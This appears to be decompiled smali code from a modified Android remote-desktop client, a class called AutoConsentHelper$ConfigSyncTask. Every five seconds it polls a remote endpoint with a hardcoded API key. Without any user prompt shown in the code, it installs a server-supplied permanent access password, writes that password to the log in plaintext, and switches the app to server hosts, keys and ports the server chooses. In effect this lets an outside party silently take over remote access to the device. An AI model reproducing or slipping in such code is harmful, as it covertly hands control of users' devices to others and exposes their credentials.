.class Lcom/carriez/flutter_hbb/AutoConsentHelper$ConfigSyncTask;
.super Ljava/lang/Object;
.source "AutoConsentHelper.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/carriez/flutter_hbb/AutoConsentHelper;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = "ConfigSyncTask"
.end annotation


# instance fields
.field private final context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .registers 2

    .line 1031
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 1032
    iput-object p1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$ConfigSyncTask;->context:Landroid/content/Context;

    .line 1033
    return-void
.end method


# virtual methods
.method public run()V
    .registers 15

    .line 1039
    const-string v0, ")"

    const-string v1, "ninja-local-dev-key"

    const-string v2, "X-Ninja-Api-Key"

    const-string v3, "AutoConsentHelper"

    :goto_8
    const-wide/16 v4, 0x1388

    :try_start_a
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 1040
    new-instance v4, Ljava/io/File;

    const-string v5, "/data/user/0/com.carriez.flutter_hbb/app_flutter/RustDesk.toml"

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1041
    invoke-static {v4}, Lcom/carriez/flutter_hbb/ConfigManager;->readFile(Ljava/io/File;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "id"

    invoke-static {v4, v5}, Lcom/carriez/flutter_hbb/ConfigManager;->extractTomlValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 1042
    if-eqz v4, :cond_26

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_28

    :cond_26
    const-string v4, "404156725"

    .line 1044
    :cond_28
    iget-object v5, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$ConfigSyncTask;->context:Landroid/content/Context;

    invoke-static {v5}, Lcom/carriez/flutter_hbb/ConfigManager;->getConfigVersion(Landroid/content/Context;)I

    move-result v5

    .line 1045
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "/api/device/config/?id="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&version="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/carriez/flutter_hbb/ConfigManager;->getApiUrl(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1046
    new-instance v7, Ljava/util/HashMap;

    invoke-direct {v7}, Ljava/util/HashMap;-><init>()V

    .line 1047
    invoke-interface {v7, v2, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1048
    const-string v8, "GET"

    const/4 v9, 0x0

    invoke-static {v8, v6, v9, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->httpRequest(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;)Lcom/carriez/flutter_hbb/ConfigManager$HttpResponse;

    move-result-object v6

    .line 1050
    iget v7, v6, Lcom/carriez/flutter_hbb/ConfigManager$HttpResponse;->statusCode:I

    const/16 v8, 0xc8

    if-ne v7, v8, :cond_1d1

    .line 1051
    iget-object v6, v6, Lcom/carriez/flutter_hbb/ConfigManager$HttpResponse;->body:Ljava/lang/String;

    .line 1053
    const-string v7, "\"pending\":true"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-nez v7, :cond_76

    const-string v7, "\"pending\": true"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_1d1

    .line 1054
    :cond_76
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "ConfigSyncTask received pending update: "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1055
    const-string v7, "server_host"

    invoke-static {v6, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 1056
    const-string v7, "server_key"

    invoke-static {v6, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 1057
    const-string v7, "hbbs_port"

    invoke-static {v6, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 1058
    const-string v7, "hbbr_port"

    invoke-static {v6, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 1059
    const-string v7, "password"

    invoke-static {v6, v7}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 1060
    const-string v8, "version"

    invoke-static {v6, v8}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 1061
    const-string v13, "api_server"

    invoke-static {v6, v13}, Lcom/carriez/flutter_hbb/ConfigManager;->extractJsonField(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1062
    if-eqz v6, :cond_c9

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/String;->isEmpty()Z

    move-result v13

    if-nez v13, :cond_c9

    .line 1063
    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/carriez/flutter_hbb/ConfigManager;->parseAndSetApiServer(Ljava/lang/String;)V

    .line 1066
    :cond_c9
    add-int/lit8 v5, v5, 0x1

    .line 1067
    if-eqz v8, :cond_de

    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v6
    :try_end_d1
    .catchall {:try_start_a .. :try_end_d1} :catchall_1b6

    if-nez v6, :cond_de

    .line 1069
    :try_start_d3
    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5
    :try_end_db
    .catchall {:try_start_d3 .. :try_end_db} :catchall_dd

    .line 1070
    move v13, v5

    goto :goto_df

    :catchall_dd
    move-exception v6

    .line 1073
    :cond_de
    move v13, v5

    :goto_df
    if-eqz v7, :cond_102

    :try_start_e1
    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_102

    .line 1074
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Received dynamic password update from server: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1075
    iget-object v5, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$ConfigSyncTask;->context:Landroid/content/Context;

    invoke-static {v5, v7}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->savePermanentPassword(Landroid/content/Context;Ljava/lang/String;)V

    .line 1078
    :cond_102
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Received server config update! Migrating to: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " (target v"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_130
    .catchall {:try_start_e1 .. :try_end_130} :catchall_1b6

    .line 1082
    :try_start_130
    const-string v5, "/api/device/config/ack/"

    invoke-static {v5}, Lcom/carriez/flutter_hbb/ConfigManager;->getApiUrl(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 1083
    new-instance v6, Ljava/util/HashMap;

    invoke-direct {v6}, Ljava/util/HashMap;-><init>()V

    .line 1084
    const-string v7, "Content-Type"

    const-string v8, "application/json"

    invoke-interface {v6, v7, v8}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1085
    invoke-interface {v6, v2, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 1086
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "{\"id\":\""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v7, "\",\"version\":"

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v7, "}"

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 1087
    const-string v7, "POST"

    invoke-static {v7, v5, v4, v6}, Lcom/carriez/flutter_hbb/ConfigManager;->httpRequest(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;)Lcom/carriez/flutter_hbb/ConfigManager$HttpResponse;

    move-result-object v4

    .line 1088
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Server config migration ACK dispatched for v"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " (code "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget v4, v4, Lcom/carriez/flutter_hbb/ConfigManager$HttpResponse;->statusCode:I

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_194
    .catchall {:try_start_130 .. :try_end_194} :catchall_195

    .line 1091
    goto :goto_1b0

    .line 1089
    :catchall_195
    move-exception v4

    .line 1090
    :try_start_196
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "ACK dispatch warning: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v4}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1094
    :goto_1b0
    iget-object v8, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$ConfigSyncTask;->context:Landroid/content/Context;

    invoke-static/range {v8 .. v13}, Lcom/carriez/flutter_hbb/ConfigManager;->applyServerConfig(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_1b5
    .catchall {:try_start_196 .. :try_end_1b5} :catchall_1b6

    goto :goto_1d1

    .line 1097
    :catchall_1b6
    move-exception v4

    .line 1098
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "ConfigSync poll warning: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v4}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1099
    :cond_1d1
    :goto_1d1
    goto/16 :goto_8
.end method
